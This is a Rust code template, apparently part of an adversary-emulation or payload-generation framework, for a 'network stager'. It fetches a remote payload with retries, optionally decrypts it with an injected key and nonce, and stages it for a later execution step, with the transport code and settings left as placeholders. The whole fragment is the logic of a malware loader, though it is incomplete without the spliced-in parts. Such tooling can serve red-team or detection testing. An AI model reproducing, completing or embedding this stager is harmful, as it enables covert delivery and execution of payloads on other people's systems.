// --- Network stager (control technique fragment) ---
//
// The fetch itself lives in the transport-specific block that `render_fragment`
// splices in below: a child downloader or the in-process WinHTTP fetch. Both
// define `fetch() -> Result<Vec<u8>, String>`; everything here is
// transport-independent — the retries, the optional staged decryption and the
// hand-off to the slot the next Execution step reads.
$TRANSPORT_CODE$

/// Fetches the configured payload and stages it for the next Execution step.
pub fn run_exec() -> Result<i32, String> {
    let key_hex: String = $KEY_DEF$;
    let nonce_hex: String = $NONCE_DEF$;
    crate::tech_dbg!("network_stager", "fetching the staged payload");

    let mut failure: Option<String> = None;
    let mut fetched: Option<Vec<u8>> = None;
    for _ in 0..=$RETRIES$ {
        match fetch() {
            Ok(bytes) => {
                fetched = Some(bytes);
                break;
            }
            Err(e) => {
                crate::tech_dbg!("network_stager", "fetch attempt failed: {e}");
                failure = Some(e);
            }
        }
    }
    if let Some(e) = failure {
        $FETCH_FAILED$
    }
    let mut bytes = match fetched {
        Some(bytes) => bytes,
        None => return Err($MSG_FETCH_FAILED$),
    };
    crate::tech_dbg!("network_stager", "fetched {} bytes", bytes.len());

    if $CRYPTO$ {
        bytes = crate::decrypt_staged(&bytes, &nonce_hex, &key_hex)?;
    }
    crate::store_staged_payload(bytes)?;
    crate::tech_dbg!("network_stager", "payload staged");
    Ok(0)
}
